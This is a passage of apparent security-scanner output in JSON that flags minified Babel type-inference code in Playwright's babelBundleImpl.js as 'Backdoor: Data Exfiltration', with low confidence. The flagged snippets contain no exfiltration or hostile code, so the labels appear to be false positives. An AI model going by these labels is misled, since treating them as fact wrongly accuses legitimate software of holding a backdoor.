                    "text": "n Ore(){return ti()}function _re(e){let t=e.operator;if(t===\"void\")return Are();if(vre.indexOf(t)>=0)return $i();if(Tre.indexOf(t)>=0)return ti();if(bre.indexOf(t)>=0)return Gm()}function Nre(e){let t=e.operator;if(Ere.indexOf(t)>=0)return $i();if(gre.indexOf(t)>=0)return Gm();if(t===\"+\"){let r=this.get(\"right\"),n=this.get(\"left\");return n.isBaseType(\"number\")&&r.isBaseType(\"number\")?$i():n.isBaseType(\"string\")||r.isBaseType(\"string\")?ti():Pre([ti(),$i()])}}function kre(){let e=[this.get(\"left\").getTypeAnnotation(),this.get(\"right\").getTypeAnnotation()];return(0,jx.createUnionType)(e)}function Bre(",
                    "rendered": {
                      "text": "n Ore(){return ti()}function _re(e){let t=e.operator;if(t===\"void\")return Are();if(vre.indexOf(t)>=0)return $i();if(Tre.indexOf(t)>=0)return ti();if(bre.indexOf(t)>=0)return Gm()}function Nre(e){let t=e.operator;if(Ere.indexOf(t)>=0)return $i();if(gre.indexOf(t)>=0)return Gm();if(t===\"+\"){let r=this.get(\"right\"),n=this.get(\"left\");return n.isBaseType(\"number\")&&r.isBaseType(\"number\")?$i():n.isBaseType(\"string\")||r.isBaseType(\"string\")?ti():Pre([ti(),$i()])}}function kre(){let e=[this.get(\"left\").getTypeAnnotation(),this.get(\"right\").getTypeAnnotation()];return(0,jx.createUnionType)(e)}function Bre(",
                      "markdown": "`n Ore(){return ti()}function _re(e){let t=e.operator;if(t===\"void\")return Are();if(vre.indexOf(t)>=0)return $i();if(Tre.indexOf(t)>=0)return ti();if(bre.indexOf(t)>=0)return Gm()}function Nre(e){let t=e.operator;if(Ere.indexOf(t)>=0)return $i();if(gre.indexOf(t)>=0)return Gm();if(t===\"+\"){let r=this.get(\"right\"),n=this.get(\"left\");return n.isBaseType(\"number\")&&r.isBaseType(\"number\")?$i():n.isBaseType(\"string\")||r.isBaseType(\"string\")?ti():Pre([ti(),$i()])}}function kre(){let e=[this.get(\"left\").getTypeAnnotation(),this.get(\"right\").getTypeAnnotation()];return(0,jx.createUnionType)(e)}function Bre(`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 18,
                  "startColumn": 8908,
                  "endLine": 18,
                  "endColumn": 8913,
                  "snippet": {
                    "text": "nionTypeAnnotation:Pre,voidTypeAnnotation:Are,isIdentifier:Cre}=mre;function wre(){if(this.get(\"id\").isIdentifier())return this.get(\"init\").getTypeAnnotation()}function Lx(e){return e.typeAnnotation}Lx.validParent=!0;function Mx(e){return e.typeAnnotation}Mx.validParent=!0;function Dre(){return this.get(\"expression\").getTypeAnnotation()}function Ire(e){if(e.callee.type===\"Identifier\")return ds(e.callee)}function Ore(){return ti()}function _re(e){let t=e.operator;if(t===\"void\")return Are();if(vre.indexOf(t)>=0)return $i();if(Tre.indexOf(t)>=0)return ti();if(bre.indexOf(t)>=0)return Gm()}function Nre",
                    "rendered": {
                      "text": "nionTypeAnnotation:Pre,voidTypeAnnotation:Are,isIdentifier:Cre}=mre;function wre(){if(this.get(\"id\").isIdentifier())return this.get(\"init\").getTypeAnnotation()}function Lx(e){return e.typeAnnotation}Lx.validParent=!0;function Mx(e){return e.typeAnnotation}Mx.validParent=!0;function Dre(){return this.get(\"expression\").getTypeAnnotation()}function Ire(e){if(e.callee.type===\"Identifier\")return ds(e.callee)}function Ore(){return ti()}function _re(e){let t=e.operator;if(t===\"void\")return Are();if(vre.indexOf(t)>=0)return $i();if(Tre.indexOf(t)>=0)return ti();if(bre.indexOf(t)>=0)return Gm()}function Nre",
                      "markdown": "`nionTypeAnnotation:Pre,voidTypeAnnotation:Are,isIdentifier:Cre}=mre;function wre(){if(this.get(\"id\").isIdentifier())return this.get(\"init\").getTypeAnnotation()}function Lx(e){return e.typeAnnotation}Lx.validParent=!0;function Mx(e){return e.typeAnnotation}Mx.validParent=!0;function Dre(){return this.get(\"expression\").getTypeAnnotation()}function Ire(e){if(e.callee.type===\"Identifier\")return ds(e.callee)}function Ore(){return ti()}function _re(e){let t=e.operator;if(t===\"void\")return Are();if(vre.indexOf(t)>=0)return $i();if(Tre.indexOf(t)>=0)return ti();if(bre.indexOf(t)>=0)return Gm()}function Nre`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 18,
                  "startColumn": 8735,
                  "endLine": 18,
                  "endColumn": 8740,
                  "snippet": {
                    "text": ",buildMatchMemberExpression:_u,genericTypeAnnotation:ds,identifier:ei,nullLiteralTypeAnnotation:Sre,numberTypeAnnotation:$i,stringTypeAnnotation:ti,tupleTypeAnnotation:xre,unionTypeAnnotation:Pre,voidTypeAnnotation:Are,isIdentifier:Cre}=mre;function wre(){if(this.get(\"id\").isIdentifier())return this.get(\"init\").getTypeAnnotation()}function Lx(e){return e.typeAnnotation}Lx.validParent=!0;function Mx(e){return e.typeAnnotation}Mx.validParent=!0;function Dre(){return this.get(\"expression\").getTypeAnnotation()}function Ire(e){if(e.callee.type===\"Identifier\")return ds(e.callee)}function Ore(){return ti(",
                    "rendered": {
                      "text": ",buildMatchMemberExpression:_u,genericTypeAnnotation:ds,identifier:ei,nullLiteralTypeAnnotation:Sre,numberTypeAnnotation:$i,stringTypeAnnotation:ti,tupleTypeAnnotation:xre,unionTypeAnnotation:Pre,voidTypeAnnotation:Are,isIdentifier:Cre}=mre;function wre(){if(this.get(\"id\").isIdentifier())return this.get(\"init\").getTypeAnnotation()}function Lx(e){return e.typeAnnotation}Lx.validParent=!0;function Mx(e){return e.typeAnnotation}Mx.validParent=!0;function Dre(){return this.get(\"expression\").getTypeAnnotation()}function Ire(e){if(e.callee.type===\"Identifier\")return ds(e.callee)}function Ore(){return ti(",
                      "markdown": "`,buildMatchMemberExpression:_u,genericTypeAnnotation:ds,identifier:ei,nullLiteralTypeAnnotation:Sre,numberTypeAnnotation:$i,stringTypeAnnotation:ti,tupleTypeAnnotation:xre,unionTypeAnnotation:Pre,voidTypeAnnotation:Are,isIdentifier:Cre}=mre;function wre(){if(this.get(\"id\").isIdentifier())return this.get(\"init\").getTypeAnnotation()}function Lx(e){return e.typeAnnotation}Lx.validParent=!0;function Mx(e){return e.typeAnnotation}Mx.validParent=!0;function Dre(){return this.get(\"expression\").getTypeAnnotation()}function Ire(e){if(e.callee.type===\"Identifier\")return ds(e.callee)}function Ore(){return ti(`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 18,
                  "startColumn": 8698,
                  "endLine": 18,
                  "endColumn": 8703,
                  "snippet": {
                    "text": "nnotation:Km,booleanTypeAnnotation:Gm,buildMatchMemberExpression:_u,genericTypeAnnotation:ds,identifier:ei,nullLiteralTypeAnnotation:Sre,numberTypeAnnotation:$i,stringTypeAnnotation:ti,tupleTypeAnnotation:xre,unionTypeAnnotation:Pre,voidTypeAnnotation:Are,isIdentifier:Cre}=mre;function wre(){if(this.get(\"id\").isIdentifier())return this.get(\"init\").getTypeAnnotation()}function Lx(e){return e.typeAnnotation}Lx.validParent=!0;function Mx(e){return e.typeAnnotation}Mx.validParent=!0;function Dre(){return this.get(\"expression\").getTypeAnnotation()}function Ire(e){if(e.callee.type===\"Identifier\")return d",
                    "rendered": {
                      "text": "nnotation:Km,booleanTypeAnnotation:Gm,buildMatchMemberExpression:_u,genericTypeAnnotation:ds,identifier:ei,nullLiteralTypeAnnotation:Sre,numberTypeAnnotation:$i,stringTypeAnnotation:ti,tupleTypeAnnotation:xre,unionTypeAnnotation:Pre,voidTypeAnnotation:Are,isIdentifier:Cre}=mre;function wre(){if(this.get(\"id\").isIdentifier())return this.get(\"init\").getTypeAnnotation()}function Lx(e){return e.typeAnnotation}Lx.validParent=!0;function Mx(e){return e.typeAnnotation}Mx.validParent=!0;function Dre(){return this.get(\"expression\").getTypeAnnotation()}function Ire(e){if(e.callee.type===\"Identifier\")return d",
                      "markdown": "`nnotation:Km,booleanTypeAnnotation:Gm,buildMatchMemberExpression:_u,genericTypeAnnotation:ds,identifier:ei,nullLiteralTypeAnnotation:Sre,numberTypeAnnotation:$i,stringTypeAnnotation:ti,tupleTypeAnnotation:xre,unionTypeAnnotation:Pre,voidTypeAnnotation:Are,isIdentifier:Cre}=mre;function wre(){if(this.get(\"id\").isIdentifier())return this.get(\"init\").getTypeAnnotation()}function Lx(e){return e.typeAnnotation}Lx.validParent=!0;function Mx(e){return e.typeAnnotation}Mx.validParent=!0;function Dre(){return this.get(\"expression\").getTypeAnnotation()}function Ire(e){if(e.callee.type===\"Identifier\")return d`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 18,
                  "startColumn": 7176,
                  "endLine": 18,
                  "endColumn": 7181,
                  "snippet": {
                    "text": "n())return t.key===\"test\"?void 0:n;if(n.isFunction()&&n.parentPath.scope.getBinding(r)!==e)return;t=n}}function kx(e,t,r){let n=hre(e,t,r);if(!n)return;let i=[n.get(\"test\")],a=[];for(let o=0;o<i.length;o++){let l=i[o];if(l.isLogicalExpression())l.node.operator===\"&&\"&&(i.push(l.get(\"left\")),i.push(l.get(\"right\")));else if(l.isBinaryExpression()){let u=dre(r,l);u&&a.push(u)}}return a.length?{typeAnnotation:(0,_x.createUnionType)(a),ifStatement:n}:kx(e,n,r)}});var Vx=E(ct=>{\"use strict\";Object.defineProperty(ct,\"__esModule\",{value:!0});ct.ArrayExpression=Rx;ct.AssignmentExpression=Lre;ct.BinaryExpres",
                    "rendered": {
                      "text": "n())return t.key===\"test\"?void 0:n;if(n.isFunction()&&n.parentPath.scope.getBinding(r)!==e)return;t=n}}function kx(e,t,r){let n=hre(e,t,r);if(!n)return;let i=[n.get(\"test\")],a=[];for(let o=0;o<i.length;o++){let l=i[o];if(l.isLogicalExpression())l.node.operator===\"&&\"&&(i.push(l.get(\"left\")),i.push(l.get(\"right\")));else if(l.isBinaryExpression()){let u=dre(r,l);u&&a.push(u)}}return a.length?{typeAnnotation:(0,_x.createUnionType)(a),ifStatement:n}:kx(e,n,r)}});var Vx=E(ct=>{\"use strict\";Object.defineProperty(ct,\"__esModule\",{value:!0});ct.ArrayExpression=Rx;ct.AssignmentExpression=Lre;ct.BinaryExpres",
                      "markdown": "`n())return t.key===\"test\"?void 0:n;if(n.isFunction()&&n.parentPath.scope.getBinding(r)!==e)return;t=n}}function kx(e,t,r){let n=hre(e,t,r);if(!n)return;let i=[n.get(\"test\")],a=[];for(let o=0;o<i.length;o++){let l=i[o];if(l.isLogicalExpression())l.node.operator===\"&&\"&&(i.push(l.get(\"left\")),i.push(l.get(\"right\")));else if(l.isBinaryExpression()){let u=dre(r,l);u&&a.push(u)}}return a.length?{typeAnnotation:(0,_x.createUnionType)(a),ifStatement:n}:kx(e,n,r)}});var Vx=E(ct=>{\"use strict\";Object.defineProperty(ct,\"__esModule\",{value:!0});ct.ArrayExpression=Rx;ct.AssignmentExpression=Lre;ct.BinaryExpres`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 18,
                  "startColumn": 7154,
                  "endLine": 18,
                  "endColumn": 7159,
                  "snippet": {
                    "text": "isConditionalExpression())return t.key===\"test\"?void 0:n;if(n.isFunction()&&n.parentPath.scope.getBinding(r)!==e)return;t=n}}function kx(e,t,r){let n=hre(e,t,r);if(!n)return;let i=[n.get(\"test\")],a=[];for(let o=0;o<i.length;o++){let l=i[o];if(l.isLogicalExpression())l.node.operator===\"&&\"&&(i.push(l.get(\"left\")),i.push(l.get(\"right\")));else if(l.isBinaryExpression()){let u=dre(r,l);u&&a.push(u)}}return a.length?{typeAnnotation:(0,_x.createUnionType)(a),ifStatement:n}:kx(e,n,r)}});var Vx=E(ct=>{\"use strict\";Object.defineProperty(ct,\"__esModule\",{value:!0});ct.ArrayExpression=Rx;ct.AssignmentExpressi",
                    "rendered": {
                      "text": "isConditionalExpression())return t.key===\"test\"?void 0:n;if(n.isFunction()&&n.parentPath.scope.getBinding(r)!==e)return;t=n}}function kx(e,t,r){let n=hre(e,t,r);if(!n)return;let i=[n.get(\"test\")],a=[];for(let o=0;o<i.length;o++){let l=i[o];if(l.isLogicalExpression())l.node.operator===\"&&\"&&(i.push(l.get(\"left\")),i.push(l.get(\"right\")));else if(l.isBinaryExpression()){let u=dre(r,l);u&&a.push(u)}}return a.length?{typeAnnotation:(0,_x.createUnionType)(a),ifStatement:n}:kx(e,n,r)}});var Vx=E(ct=>{\"use strict\";Object.defineProperty(ct,\"__esModule\",{value:!0});ct.ArrayExpression=Rx;ct.AssignmentExpressi",
                      "markdown": "`isConditionalExpression())return t.key===\"test\"?void 0:n;if(n.isFunction()&&n.parentPath.scope.getBinding(r)!==e)return;t=n}}function kx(e,t,r){let n=hre(e,t,r);if(!n)return;let i=[n.get(\"test\")],a=[];for(let o=0;o<i.length;o++){let l=i[o];if(l.isLogicalExpression())l.node.operator===\"&&\"&&(i.push(l.get(\"left\")),i.push(l.get(\"right\")));else if(l.isBinaryExpression()){let u=dre(r,l);u&&a.push(u)}}return a.length?{typeAnnotation:(0,_x.createUnionType)(a),ifStatement:n}:kx(e,n,r)}});var Vx=E(ct=>{\"use strict\";Object.defineProperty(ct,\"__esModule\",{value:!0});ct.ArrayExpression=Rx;ct.AssignmentExpressi`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 18,
                  "startColumn": 7036,
                  "endLine": 18,
                  "endColumn": 7041,
                  "snippet": {
                    "text": "ode.value;if(typeof l==\"string\")return ure(l)}function hre(e,t,r){let n;for(;n=t.parentPath;){if(n.isIfStatement()||n.isConditionalExpression())return t.key===\"test\"?void 0:n;if(n.isFunction()&&n.parentPath.scope.getBinding(r)!==e)return;t=n}}function kx(e,t,r){let n=hre(e,t,r);if(!n)return;let i=[n.get(\"test\")],a=[];for(let o=0;o<i.length;o++){let l=i[o];if(l.isLogicalExpression())l.node.operator===\"&&\"&&(i.push(l.get(\"left\")),i.push(l.get(\"right\")));else if(l.isBinaryExpression()){let u=dre(r,l);u&&a.push(u)}}return a.length?{typeAnnotation:(0,_x.createUnionType)(a),ifStatement:n}:kx(e,n,r)}});va",
                    "rendered": {
                      "text": "ode.value;if(typeof l==\"string\")return ure(l)}function hre(e,t,r){let n;for(;n=t.parentPath;){if(n.isIfStatement()||n.isConditionalExpression())return t.key===\"test\"?void 0:n;if(n.isFunction()&&n.parentPath.scope.getBinding(r)!==e)return;t=n}}function kx(e,t,r){let n=hre(e,t,r);if(!n)return;let i=[n.get(\"test\")],a=[];for(let o=0;o<i.length;o++){let l=i[o];if(l.isLogicalExpression())l.node.operator===\"&&\"&&(i.push(l.get(\"left\")),i.push(l.get(\"right\")));else if(l.isBinaryExpression()){let u=dre(r,l);u&&a.push(u)}}return a.length?{typeAnnotation:(0,_x.createUnionType)(a),ifStatement:n}:kx(e,n,r)}});va",
                      "markdown": "`ode.value;if(typeof l==\"string\")return ure(l)}function hre(e,t,r){let n;for(;n=t.parentPath;){if(n.isIfStatement()||n.isConditionalExpression())return t.key===\"test\"?void 0:n;if(n.isFunction()&&n.parentPath.scope.getBinding(r)!==e)return;t=n}}function kx(e,t,r){let n=hre(e,t,r);if(!n)return;let i=[n.get(\"test\")],a=[];for(let o=0;o<i.length;o++){let l=i[o];if(l.isLogicalExpression())l.node.operator===\"&&\"&&(i.push(l.get(\"left\")),i.push(l.get(\"right\")));else if(l.isBinaryExpression()){let u=dre(r,l);u&&a.push(u)}}return a.length?{typeAnnotation:(0,_x.createUnionType)(a),ifStatement:n}:kx(e,n,r)}});va`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 18,
                  "startColumn": 6648,
                  "endLine": 18,
                  "endColumn": 6653,
                  "snippet": {
                    "text": "\").resolve(),i;if(s.isIdentifier({name:e})?i=n:n.isIdentifier({name:e})&&(i=s),i)return r===\"===\"?i.getTypeAnnotation():lre.indexOf(r)>=0?Nx():void 0;if(r!==\"===\"&&r!==\"==\")return;let a,o;if(s.isUnaryExpression({operator:\"typeof\"})?(a=s,o=n):n.isUnaryExpression({operator:\"typeof\"})&&(a=n,o=s),!a||!a.get(\"argument\").isIdentifier({name:e})||(o=o.resolve(),!o.isLiteral()))return;let l=o.node.value;if(typeof l==\"string\")return ure(l)}function hre(e,t,r){let n;for(;n=t.parentPath;){if(n.isIfStatement()||n.isConditionalExpression())return t.key===\"test\"?void 0:n;if(n.isFunction()&&n.parentPath.scope.getB",
                    "rendered": {
                      "text": "\").resolve(),i;if(s.isIdentifier({name:e})?i=n:n.isIdentifier({name:e})&&(i=s),i)return r===\"===\"?i.getTypeAnnotation():lre.indexOf(r)>=0?Nx():void 0;if(r!==\"===\"&&r!==\"==\")return;let a,o;if(s.isUnaryExpression({operator:\"typeof\"})?(a=s,o=n):n.isUnaryExpression({operator:\"typeof\"})&&(a=n,o=s),!a||!a.get(\"argument\").isIdentifier({name:e})||(o=o.resolve(),!o.isLiteral()))return;let l=o.node.value;if(typeof l==\"string\")return ure(l)}function hre(e,t,r){let n;for(;n=t.parentPath;){if(n.isIfStatement()||n.isConditionalExpression())return t.key===\"test\"?void 0:n;if(n.isFunction()&&n.parentPath.scope.getB",
                      "markdown": "`\").resolve(),i;if(s.isIdentifier({name:e})?i=n:n.isIdentifier({name:e})&&(i=s),i)return r===\"===\"?i.getTypeAnnotation():lre.indexOf(r)>=0?Nx():void 0;if(r!==\"===\"&&r!==\"==\")return;let a,o;if(s.isUnaryExpression({operator:\"typeof\"})?(a=s,o=n):n.isUnaryExpression({operator:\"typeof\"})&&(a=n,o=s),!a||!a.get(\"argument\").isIdentifier({name:e})||(o=o.resolve(),!o.isLiteral()))return;let l=o.node.value;if(typeof l==\"string\")return ure(l)}function hre(e,t,r){let n;for(;n=t.parentPath;){if(n.isIfStatement()||n.isConditionalExpression())return t.key===\"test\"?void 0:n;if(n.isFunction()&&n.parentPath.scope.getB`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 18,
                  "startColumn": 6338,
                  "endLine": 18,
                  "endColumn": 6343,
                  "snippet": {
                    "text": "eturn(0,_x.createUnionType)(n)}function Ox(e,t,r){let n=e.constantViolations.slice();return n.unshift(e.path),n.filter(s=>{s=s.resolve();let i=s._guessExecutionStatusRelativeTo(t);return r&&i===\"unknown\"&&r.push(s),i===\"before\"})}function dre(e,t){let r=t.node.operator,n=t.get(\"right\").resolve(),s=t.get(\"left\").resolve(),i;if(s.isIdentifier({name:e})?i=n:n.isIdentifier({name:e})&&(i=s),i)return r===\"===\"?i.getTypeAnnotation():lre.indexOf(r)>=0?Nx():void 0;if(r!==\"===\"&&r!==\"==\")return;let a,o;if(s.isUnaryExpression({operator:\"typeof\"})?(a=s,o=n):n.isUnaryExpression({operator:\"typeof\"})&&(a=n,o=s),!",
                    "rendered": {
                      "text": "eturn(0,_x.createUnionType)(n)}function Ox(e,t,r){let n=e.constantViolations.slice();return n.unshift(e.path),n.filter(s=>{s=s.resolve();let i=s._guessExecutionStatusRelativeTo(t);return r&&i===\"unknown\"&&r.push(s),i===\"before\"})}function dre(e,t){let r=t.node.operator,n=t.get(\"right\").resolve(),s=t.get(\"left\").resolve(),i;if(s.isIdentifier({name:e})?i=n:n.isIdentifier({name:e})&&(i=s),i)return r===\"===\"?i.getTypeAnnotation():lre.indexOf(r)>=0?Nx():void 0;if(r!==\"===\"&&r!==\"==\")return;let a,o;if(s.isUnaryExpression({operator:\"typeof\"})?(a=s,o=n):n.isUnaryExpression({operator:\"typeof\"})&&(a=n,o=s),!",
                      "markdown": "`eturn(0,_x.createUnionType)(n)}function Ox(e,t,r){let n=e.constantViolations.slice();return n.unshift(e.path),n.filter(s=>{s=s.resolve();let i=s._guessExecutionStatusRelativeTo(t);return r&&i===\"unknown\"&&r.push(s),i===\"before\"})}function dre(e,t){let r=t.node.operator,n=t.get(\"right\").resolve(),s=t.get(\"left\").resolve(),i;if(s.isIdentifier({name:e})?i=n:n.isIdentifier({name:e})&&(i=s),i)return r===\"===\"?i.getTypeAnnotation():lre.indexOf(r)>=0?Nx():void 0;if(r!==\"===\"&&r!==\"==\")return;let a,o;if(s.isUnaryExpression({operator:\"typeof\"})?(a=s,o=n):n.isUnaryExpression({operator:\"typeof\"})&&(a=n,o=s),!`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 18,
                  "startColumn": 6311,
                  "endLine": 18,
                  "endColumn": 6316,
                  "snippet": {
                    "text": "Annotation())}if(n.length)return(0,_x.createUnionType)(n)}function Ox(e,t,r){let n=e.constantViolations.slice();return n.unshift(e.path),n.filter(s=>{s=s.resolve();let i=s._guessExecutionStatusRelativeTo(t);return r&&i===\"unknown\"&&r.push(s),i===\"before\"})}function dre(e,t){let r=t.node.operator,n=t.get(\"right\").resolve(),s=t.get(\"left\").resolve(),i;if(s.isIdentifier({name:e})?i=n:n.isIdentifier({name:e})&&(i=s),i)return r===\"===\"?i.getTypeAnnotation():lre.indexOf(r)>=0?Nx():void 0;if(r!==\"===\"&&r!==\"==\")return;let a,o;if(s.isUnaryExpression({operator:\"typeof\"})?(a=s,o=n):n.isUnaryExpression({opera",
                    "rendered": {
                      "text": "Annotation())}if(n.length)return(0,_x.createUnionType)(n)}function Ox(e,t,r){let n=e.constantViolations.slice();return n.unshift(e.path),n.filter(s=>{s=s.resolve();let i=s._guessExecutionStatusRelativeTo(t);return r&&i===\"unknown\"&&r.push(s),i===\"before\"})}function dre(e,t){let r=t.node.operator,n=t.get(\"right\").resolve(),s=t.get(\"left\").resolve(),i;if(s.isIdentifier({name:e})?i=n:n.isIdentifier({name:e})&&(i=s),i)return r===\"===\"?i.getTypeAnnotation():lre.indexOf(r)>=0?Nx():void 0;if(r!==\"===\"&&r!==\"==\")return;let a,o;if(s.isUnaryExpression({operator:\"typeof\"})?(a=s,o=n):n.isUnaryExpression({opera",
                      "markdown": "`Annotation())}if(n.length)return(0,_x.createUnionType)(n)}function Ox(e,t,r){let n=e.constantViolations.slice();return n.unshift(e.path),n.filter(s=>{s=s.resolve();let i=s._guessExecutionStatusRelativeTo(t);return r&&i===\"unknown\"&&r.push(s),i===\"before\"})}function dre(e,t){let r=t.node.operator,n=t.get(\"right\").resolve(),s=t.get(\"left\").resolve(),i;if(s.isIdentifier({name:e})?i=n:n.isIdentifier({name:e})&&(i=s),i)return r===\"===\"?i.getTypeAnnotation():lre.indexOf(r)>=0?Nx():void 0;if(r!==\"===\"&&r!==\"==\")return;let a,o;if(s.isUnaryExpression({operator:\"typeof\"})?(a=s,o=n):n.isUnaryExpression({opera`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 15,
                  "startColumn": 32375,
                  "endLine": 15,
                  "endColumn": 32380,
                  "snippet": {
                    "text": "Word=!1,this._lastCommentLine=0,this._endsWithInnerRaw=!1,this._indentInnerComments=!0,this.format=t,this._indentRepeat=t.indent.style.length,this._inputMap=r==null?void 0:r._inputMap,this._buf=new Ite.default(r,t.indent.style[0])}generate(t){return this.print(t),this._maybeAddAuxComment(),this._buf.get()}indent(){this.format.compact||this.format.concise||this._indent++}dedent(){this.format.compact||this.format.concise||this._indent--}semicolon(t=!1){this._maybeAddAuxComment(),t?this._appendChar(59):this._queue(59),this._noLineTerminator=!1}rightBrace(t){this.format.minified&&this._buf.removeLastSe",
                    "rendered": {
                      "text": "Word=!1,this._lastCommentLine=0,this._endsWithInnerRaw=!1,this._indentInnerComments=!0,this.format=t,this._indentRepeat=t.indent.style.length,this._inputMap=r==null?void 0:r._inputMap,this._buf=new Ite.default(r,t.indent.style[0])}generate(t){return this.print(t),this._maybeAddAuxComment(),this._buf.get()}indent(){this.format.compact||this.format.concise||this._indent++}dedent(){this.format.compact||this.format.concise||this._indent--}semicolon(t=!1){this._maybeAddAuxComment(),t?this._appendChar(59):this._queue(59),this._noLineTerminator=!1}rightBrace(t){this.format.minified&&this._buf.removeLastSe",
                      "markdown": "`Word=!1,this._lastCommentLine=0,this._endsWithInnerRaw=!1,this._indentInnerComments=!0,this.format=t,this._indentRepeat=t.indent.style.length,this._inputMap=r==null?void 0:r._inputMap,this._buf=new Ite.default(r,t.indent.style[0])}generate(t){return this.print(t),this._maybeAddAuxComment(),this._buf.get()}indent(){this.format.compact||this.format.concise||this._indent++}dedent(){this.format.compact||this.format.concise||this._indent--}semicolon(t=!1){this._maybeAddAuxComment(),t?this._appendChar(59):this._queue(59),this._noLineTerminator=!1}rightBrace(t){this.format.minified&&this._buf.removeLastSe`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 14,
                  "startColumn": 10543,
                  "endLine": 14,
                  "endColumn": 10548,
                  "snippet": {
